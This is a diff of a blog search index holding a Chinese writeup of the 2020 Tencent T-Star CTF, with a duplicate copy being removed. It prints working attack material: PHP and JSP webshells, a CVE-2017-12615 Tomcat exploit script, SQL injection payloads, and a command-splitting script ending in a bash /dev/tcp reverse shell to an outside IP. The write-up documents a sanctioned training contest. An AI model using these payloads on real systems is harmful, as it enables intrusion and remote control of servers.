@@ -2,78 +2,78 @@
 <search>
   <entry>
     <title>腾讯T-Star高校挑战赛writeup --白给</title>
-    <url>/2020/07/05/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
+    <url>/2020/07/05/T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
     <content><![CDATA[<p>2020.06.30，参加T-Star高校挑战赛，总共十个题，团队做出来八个，感谢队友带飞。</p>
-<p><img src="image-20200703143606576.png" alt="image-20200703143606576"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703143606576.png" alt="image-20200703143606576"></p>
 <a id="more"></a>
-<p><img src="image-20200703143513478.png" alt="image-20200703143513478"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703143513478.png" alt="image-20200703143513478"></p>
 <h2 id="1-题目一-签到"><a href="#1-题目一-签到" class="headerlink" title="1.题目一 签到"></a>1.题目一 签到</h2><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传为前端js的验证，将php一句话后缀改为jpg，上传抓包修改后缀为php，上传成功</p>
-<p><img src="wps52E.tmp.jpg" alt="img"> </p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cwps52E.tmp.jpg" alt="img"> </p>
 <p>查看地址</p>
-<p><img src="wps53F.tmp.jpg" alt="img"> </p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cwps53F.tmp.jpg" alt="img"> </p>
 <p>用菜刀连接，查看flag</p>
-<p><img src="wps540.tmp.jpg" alt="img"> </p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cwps540.tmp.jpg" alt="img"> </p>
 <h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>key{K735c9f0D7ddc3b9}</p>
 <h2 id="2-题目二-命令执行基础"><a href="#2-题目二-命令执行基础" class="headerlink" title="2.题目二 命令执行基础"></a>2.题目二 命令执行基础</h2><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用&amp;&amp;不行，采用管道符执行。</p>
-<p><img src="image-20200703143926169.png" alt="image-20200703143926169"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703143926169.png" alt="image-20200703143926169"></p>
 <p>执行结果：</p>
-<p><img src="image-20200703143935690.png" alt="image-20200703143935690"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703143935690.png" alt="image-20200703143935690"></p>
 <p>通过查看上级目录文件不断查看，找打key文件位置。cat查看内容</p>
-<p><img src="image-20200703143940672.png" alt="image-20200703143940672"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703143940672.png" alt="image-20200703143940672"></p>
 <p>查看结果:</p>
-<p><img src="image-20200703143950416.png" alt="image-20200703143950416"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703143950416.png" alt="image-20200703143950416"></p>
 <h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{usderhky}</p>
 <h2 id="3-题目三-你能爆破吗"><a href="#3-题目三-你能爆破吗" class="headerlink" title="3.题目三 你能爆破吗"></a>3.题目三 你能爆破吗</h2><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>admin admin弱口令登进去，发现回显cookie，可以用cookie注入，cookie为用户名的base64编码，所以还需要把payload进行base64编码<br>首先判断字段数，暴出位置，<br>暴库payload：<br>-admin” union select 1,2,database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</p>
-<p><img src="image-20200703144314036.png" alt="image-20200703144314036"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144314036.png" alt="image-20200703144314036"></p>
 <p>爆表：<br>-admin” union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkj</p>
-<p><img src="image-20200703144320621.png" alt="image-20200703144320621"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144320621.png" alt="image-20200703144320621"></p>
 <p>暴字段：<br>-admin” union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’flag’#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdmbGFnJyM=</p>
-<p><img src="image-20200703144332264.png" alt="image-20200703144332264"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144332264.png" alt="image-20200703144332264"></p>
 <p>暴值：<br>-admin” union select 1,2,group_concat(flag) from flag#</p>
-<p><img src="image-20200703144338860.png" alt="image-20200703144338860"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144338860.png" alt="image-20200703144338860"></p>
 <h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a405ef895ef46d96}</p>
 <h2 id="4-题目四-文件上传"><a href="#4-题目四-文件上传" class="headerlink" title="4.题目四 文件上传"></a>4.题目四 文件上传</h2><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传抓包修改文件后缀，php被过滤不能上传，用pht也可以解析成php，图片内容之后加上php代码查看phpinfo发现被过滤了前面的尖括号、问号和php</p>
-<p><img src="image-20200703144445977.png" alt="image-20200703144445977"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144445977.png" alt="image-20200703144445977"></p>
 <p>使用双写绕过</p>
-<p><img src="image-20200703144532773.png" alt="image-20200703144532773"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144532773.png" alt="image-20200703144532773"></p>
 <p>查看成功解析</p>
-<p><img src="image-20200703144537190.png" alt="image-20200703144537190"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144537190.png" alt="image-20200703144537190"></p>
 <p>构造payload重传，</p>
-<p><img src="image-20200703144542942.png" alt="image-20200703144542942"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144542942.png" alt="image-20200703144542942"></p>
 <p>解析页面传参代码执行得到flag</p>
-<p><img src="image-20200703144548208.png" alt="image-20200703144548208"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144548208.png" alt="image-20200703144548208"></p>
 <h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Aa3c7c37508E40B3}</p>
 <h2 id="5-题目五-文件包含GetShell"><a href="#5-题目五-文件包含GetShell" class="headerlink" title="5.题目五 文件包含GetShell"></a>5.题目五 文件包含GetShell</h2><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源码，发现了lfi.txt，查看lfi.txt，发现可以文件包含，上传只能上传txt类型</p>
-<p><img src="image-20200703144845841.png" alt="image-20200703144845841"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144845841.png" alt="image-20200703144845841"></p>
 <p>把php一句话压缩成zip</p>
-<p><img src="image-20200703144849819.png" alt="image-20200703144849819"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144849819.png" alt="image-20200703144849819"></p>
 <p>压缩之后修改后缀为txt，上传成功</p>
-<p><img src="image-20200703144857316.png" alt="image-20200703144857316"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144857316.png" alt="image-20200703144857316"></p>
 <p>用php伪协议phar://解压进行利用<br><a href="http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33" target="_blank" rel="noopener">http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33</a><br>菜刀连接找到flag</p>
-<p><img src="image-20200703144902999.png" alt="image-20200703144902999"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144902999.png" alt="image-20200703144902999"></p>
 <p>查看</p>
-<p><img src="image-20200703144906810.png" alt="image-20200703144906810"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144906810.png" alt="image-20200703144906810"></p>
 <h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{weisuohenzhongyao}</p>
 <h2 id="6-题目六-成绩单"><a href="#6-题目六-成绩单" class="headerlink" title="6.题目六 成绩单"></a>6.题目六 成绩单</h2><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>post注入，单引号字符型注入，啥都没过滤，写wp就直接用sqlmap跑了。</p>
 <p>post抓包得到请求包，保存为1.txt</p>
-<p><img src="wpsC6AA.tmp.jpg" alt="img"> </p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5CwpsC6AA.tmp.jpg" alt="img"> </p>
 <p>sqlmap一把梭</p>
 <p>暴值得到flag：sqlmap.py -r 1.txt -D web1 –level 3 -T fl4g -C flag –dump</p>
-<p><img src="wpsC6AB.tmp.jpg" alt="img"> </p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5CwpsC6AB.tmp.jpg" alt="img"> </p>
 <h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Sql_INJECT0N_4813drd8hz4}</p>
 <h2 id="7-题目七-小猫咪踩灯泡"><a href="#7-题目七-小猫咪踩灯泡" class="headerlink" title="7.题目七 小猫咪踩灯泡"></a>7.题目七 小猫咪踩灯泡</h2><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>CVE-2017-12615，github找exp，原理是通过上传jsp的脚本来拿到webshell。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def attack(url):</span><br><span class="line">	user_agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;</span><br><span class="line">	headers&#x3D;&#123;&quot;User-Agent&quot;:user_agent&#125;</span><br><span class="line">	data&#x3D;&quot;&quot;&quot;&lt;%</span><br><span class="line">    if(&quot;fff&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&quot;&quot;&quot;</span><br><span class="line">	try:</span><br><span class="line">		requests.put(url, headers&#x3D;headers, data&#x3D;data)</span><br><span class="line">		time.sleep(2)</span><br><span class="line">		verify_response &#x3D; requests.get(url[:-1], headers&#x3D;headers)</span><br><span class="line">		if verify_response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			print &#39;success!&#39;</span><br><span class="line">		else :</span><br><span class="line">			print verify_response.status_code</span><br><span class="line">	except :</span><br><span class="line">		&quot;error&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	target_url &#x3D; sys.argv[1] + &#39;2017126151.jsp&#x2F;&#39;</span><br><span class="line">	attack(target_url)</span><br><span class="line">	print &#39;shell: &#39; + target_url[:-1]</span><br></pre></td></tr></table></figure>
 
 <p>运行脚本，上传shell，得到shell位置，提交参数查询得到flag</p>
 <p><a href="http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt" target="_blank" rel="noopener">http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt</a></p>
-<p><img src="image-20200703145708208.png" alt="image-20200703145708208"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703145708208.png" alt="image-20200703145708208"></p>
 <h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{54e47be053bf6ea1}</p>
 <h2 id="8-题目八-分析代码获得flag"><a href="#8-题目八-分析代码获得flag" class="headerlink" title="8.题目八 分析代码获得flag"></a>8.题目八 分析代码获得flag</h2><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>运行脚本文件，写入payload</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">payload &#x3D; [</span><br><span class="line">    &#39;&gt;ls\\&#39;, </span><br><span class="line">    &#39;ls&gt;_&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;-t\\&#39;, </span><br><span class="line">    &#39;&gt;\&gt;g&#39;, </span><br><span class="line">    &#39;ls&gt;&gt;_&#39;, </span><br><span class="line"></span><br><span class="line">    &#39;&gt;sh&#39;, </span><br><span class="line">    &#39;&gt;ba\\&#39;, </span><br><span class="line">    &#39;&gt;\|\\&#39;,</span><br><span class="line">    &#39;&gt;32\\&#39;,</span><br><span class="line">    &#39;&gt;1.\\&#39;,</span><br><span class="line">    &#39;&gt;5\\&#39;, </span><br><span class="line">    &#39;&gt;2.\\&#39;,</span><br><span class="line">    &#39;&gt;10\\&#39;, </span><br><span class="line">    &#39;&gt;9.\\&#39;, </span><br><span class="line">    &#39;&gt;3\\&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;rl\\&#39;, </span><br><span class="line">    &#39;&gt;cu\\&#39;, </span><br><span class="line"></span><br><span class="line">    # exec</span><br><span class="line">    &#39;sh _&#39;, </span><br><span class="line">    &#39;sh g&#39;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;&#x3D; 5 </span><br><span class="line">    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?1&#x3D;&#39; + quote(i) )</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure>
 
 <p>服务器配置，在index.php中写入脚本<br>bash -i &gt;&amp; /dev/tcp/39.105.51.32/8080 0&gt;&amp;1<br>nc监听，运行脚本，反弹shell<br>nc -lvvp 8080<br>终端中查看文件内容得到flag<br>flag{a1c8BFF2}</p>
 <p>之后看第一名战队的wp，还可以用cat读取上级目录中的文件内容来获取flag</p>
-<p><img src="image-20200703151818734.png" alt="image-20200703151818734"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703151818734.png" alt="image-20200703151818734"></p>
 <h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a1c8BFF2}</p>
 <h2 id="9-SQL注入1"><a href="#9-SQL注入1" class="headerlink" title="9.SQL注入1"></a>9.SQL注入1</h2><p>群里大佬提出是limit注入写文件</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INTO OUTFILE &#39;物理路径&#39; lines terminated by  （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; fields terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; columns terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; lines starting by    （一句话hex编码）</span><br></pre></td></tr></table></figure>
@@ -82,102 +82,7 @@
 <h2 id="10-SQL注入2"><a href="#10-SQL注入2" class="headerlink" title="10.SQL注入2"></a>10.SQL注入2</h2><p>御剑扫wwwroot.zip，过滤方法中看到过滤的比较凶。赛后通过第一名战队的wp来看，应该是异或注入。猜测账号密码图片都在同一个数据库表中。通过poc猜解出password的hash。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">a &#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]</span><br><span class="line">temp &#x3D; &#39;&#39;</span><br><span class="line">while(1):</span><br><span class="line">    for i in a:</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;23dcf1dc.yunyansec.com&#x2F;picture.php?id&#x3D;3&quot; or password REGEXP &#39;+&#39;\&#39;^&#39;+temp+i+&#39;\&#39; %23&#39;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;not found&#39; not in r.text:</span><br><span class="line">            temp &#x3D; temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
 
-<p><img src="image-20200703152040620.png" alt="image-20200703152040620"></p>
-<p>二十位的hash，可能为dedecms，然后去掉前三位跟后一位然后md5解密得到密码，登录拿到flag。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">详细sql1解法，第一名战队的wp：https:&#x2F;&#x2F;0xfire.me&#x2F;2020&#x2F;06&#x2F;30&#x2F;T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B&#x2F;</span><br><span class="line">github中也有SQL1的解题方法：https:&#x2F;&#x2F;github.com&#x2F;XDSEC&#x2F;xdsec_ctf&#x2F;tree&#x2F;494b53d388186e8be21e753bb2048362842280c1&#x2F;xdctf2015&#x2F;izyCTF</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>T-Star高校挑战赛</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>腾讯T-Star高校挑战赛writeup --白给</title>
-    <url>/2020/07/05/T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp/T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
-    <content><![CDATA[<p>2020.06.30，参加T-Star高校挑战赛，总共十个题，团队做出来八个，感谢队友带飞。</p>
-<p><img src="image-20200703143606576.png" alt="image-20200703143606576"></p>
-<a id="more"></a>
-<p><img src="image-20200703143513478.png" alt="image-20200703143513478"></p>
-<h2 id="1-题目一-签到"><a href="#1-题目一-签到" class="headerlink" title="1.题目一 签到"></a>1.题目一 签到</h2><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传为前端js的验证，将php一句话后缀改为jpg，上传抓包修改后缀为php，上传成功</p>
-<p><img src="wps52E.tmp.jpg" alt="img"> </p>
-<p>查看地址</p>
-<p><img src="wps53F.tmp.jpg" alt="img"> </p>
-<p>用菜刀连接，查看flag</p>
-<p><img src="wps540.tmp.jpg" alt="img"> </p>
-<h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>key{K735c9f0D7ddc3b9}</p>
-<h2 id="2-题目二-命令执行基础"><a href="#2-题目二-命令执行基础" class="headerlink" title="2.题目二 命令执行基础"></a>2.题目二 命令执行基础</h2><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用&amp;&amp;不行，采用管道符执行。</p>
-<p><img src="image-20200703143926169.png" alt="image-20200703143926169"></p>
-<p>执行结果：</p>
-<p><img src="image-20200703143935690.png" alt="image-20200703143935690"></p>
-<p>通过查看上级目录文件不断查看，找打key文件位置。cat查看内容</p>
-<p><img src="image-20200703143940672.png" alt="image-20200703143940672"></p>
-<p>查看结果:</p>
-<p><img src="image-20200703143950416.png" alt="image-20200703143950416"></p>
-<h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{usderhky}</p>
-<h2 id="3-题目三-你能爆破吗"><a href="#3-题目三-你能爆破吗" class="headerlink" title="3.题目三 你能爆破吗"></a>3.题目三 你能爆破吗</h2><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>admin admin弱口令登进去，发现回显cookie，可以用cookie注入，cookie为用户名的base64编码，所以还需要把payload进行base64编码<br>首先判断字段数，暴出位置，<br>暴库payload：<br>-admin” union select 1,2,database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</p>
-<p><img src="image-20200703144314036.png" alt="image-20200703144314036"></p>
-<p>爆表：<br>-admin” union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkj</p>
-<p><img src="image-20200703144320621.png" alt="image-20200703144320621"></p>
-<p>暴字段：<br>-admin” union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’flag’#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdmbGFnJyM=</p>
-<p><img src="image-20200703144332264.png" alt="image-20200703144332264"></p>
-<p>暴值：<br>-admin” union select 1,2,group_concat(flag) from flag#</p>
-<p><img src="image-20200703144338860.png" alt="image-20200703144338860"></p>
-<h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a405ef895ef46d96}</p>
-<h2 id="4-题目四-文件上传"><a href="#4-题目四-文件上传" class="headerlink" title="4.题目四 文件上传"></a>4.题目四 文件上传</h2><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传抓包修改文件后缀，php被过滤不能上传，用pht也可以解析成php，图片内容之后加上php代码查看phpinfo发现被过滤了前面的尖括号、问号和php</p>
-<p><img src="image-20200703144445977.png" alt="image-20200703144445977"></p>
-<p>使用双写绕过</p>
-<p><img src="image-20200703144532773.png" alt="image-20200703144532773"></p>
-<p>查看成功解析</p>
-<p><img src="image-20200703144537190.png" alt="image-20200703144537190"></p>
-<p>构造payload重传，</p>
-<p><img src="image-20200703144542942.png" alt="image-20200703144542942"></p>
-<p>解析页面传参代码执行得到flag</p>
-<p><img src="image-20200703144548208.png" alt="image-20200703144548208"></p>
-<h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Aa3c7c37508E40B3}</p>
-<h2 id="5-题目五-文件包含GetShell"><a href="#5-题目五-文件包含GetShell" class="headerlink" title="5.题目五 文件包含GetShell"></a>5.题目五 文件包含GetShell</h2><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源码，发现了lfi.txt，查看lfi.txt，发现可以文件包含，上传只能上传txt类型</p>
-<p><img src="image-20200703144845841.png" alt="image-20200703144845841"></p>
-<p>把php一句话压缩成zip</p>
-<p><img src="image-20200703144849819.png" alt="image-20200703144849819"></p>
-<p>压缩之后修改后缀为txt，上传成功</p>
-<p><img src="image-20200703144857316.png" alt="image-20200703144857316"></p>
-<p>用php伪协议phar://解压进行利用<br><a href="http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33" target="_blank" rel="noopener">http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33</a><br>菜刀连接找到flag</p>
-<p><img src="image-20200703144902999.png" alt="image-20200703144902999"></p>
-<p>查看</p>
-<p><img src="image-20200703144906810.png" alt="image-20200703144906810"></p>
-<h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{weisuohenzhongyao}</p>
-<h2 id="6-题目六-成绩单"><a href="#6-题目六-成绩单" class="headerlink" title="6.题目六 成绩单"></a>6.题目六 成绩单</h2><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>post注入，单引号字符型注入，啥都没过滤，写wp就直接用sqlmap跑了。</p>
-<p>post抓包得到请求包，保存为1.txt</p>
-<p><img src="wpsC6AA.tmp.jpg" alt="img"> </p>
-<p>sqlmap一把梭</p>
-<p>暴值得到flag：sqlmap.py -r 1.txt -D web1 –level 3 -T fl4g -C flag –dump</p>
-<p><img src="wpsC6AB.tmp.jpg" alt="img"> </p>
-<h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Sql_INJECT0N_4813drd8hz4}</p>
-<h2 id="7-题目七-小猫咪踩灯泡"><a href="#7-题目七-小猫咪踩灯泡" class="headerlink" title="7.题目七 小猫咪踩灯泡"></a>7.题目七 小猫咪踩灯泡</h2><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>CVE-2017-12615，github找exp，原理是通过上传jsp的脚本来拿到webshell。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def attack(url):</span><br><span class="line">	user_agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;</span><br><span class="line">	headers&#x3D;&#123;&quot;User-Agent&quot;:user_agent&#125;</span><br><span class="line">	data&#x3D;&quot;&quot;&quot;&lt;%</span><br><span class="line">    if(&quot;fff&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&quot;&quot;&quot;</span><br><span class="line">	try:</span><br><span class="line">		requests.put(url, headers&#x3D;headers, data&#x3D;data)</span><br><span class="line">		time.sleep(2)</span><br><span class="line">		verify_response &#x3D; requests.get(url[:-1], headers&#x3D;headers)</span><br><span class="line">		if verify_response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			print &#39;success!&#39;</span><br><span class="line">		else :</span><br><span class="line">			print verify_response.status_code</span><br><span class="line">	except :</span><br><span class="line">		&quot;error&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	target_url &#x3D; sys.argv[1] + &#39;2017126151.jsp&#x2F;&#39;</span><br><span class="line">	attack(target_url)</span><br><span class="line">	print &#39;shell: &#39; + target_url[:-1]</span><br></pre></td></tr></table></figure>
-
-<p>运行脚本，上传shell，得到shell位置，提交参数查询得到flag</p>
